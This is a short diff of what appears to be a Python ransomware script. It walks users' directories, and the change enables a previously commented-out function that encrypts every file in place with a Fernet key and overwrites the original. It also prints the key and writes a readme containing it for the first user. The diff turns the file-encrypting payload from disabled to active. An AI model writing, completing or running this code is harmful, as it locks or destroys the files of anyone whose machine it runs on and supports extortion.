@@ -16,6 +16,7 @@ def main():
     users = get_users(base_path, backslash, ignore)
     directories = set_directories(users, backslash)
     loop(directories, ignore, f)
+    print(key.decode())
     write_readme(users[0], key.decode())
 
 
@@ -57,13 +58,13 @@ def loop(directories: list[str], ignore: list[str], f: Fernet):
 def read(file_path: str, f: Fernet):
     with open(file_path, "rb") as file:
         content = file.read()
-    # magic(content, file_path, f)
+        magic(content, file_path, f)
 
 
-# def magic(content, file_path: str, f: Fernet):
-#     e_content = f.encrypt(content)
-#     with open(file_path, "wb") as file:
-#         file.write(e_content)
+def magic(content, file_path: str, f: Fernet):
+    e_content = f.encrypt(content)
+    with open(file_path, "wb") as file:
+        file.write(e_content)
 
 
 def write_readme(username: str, key: str):
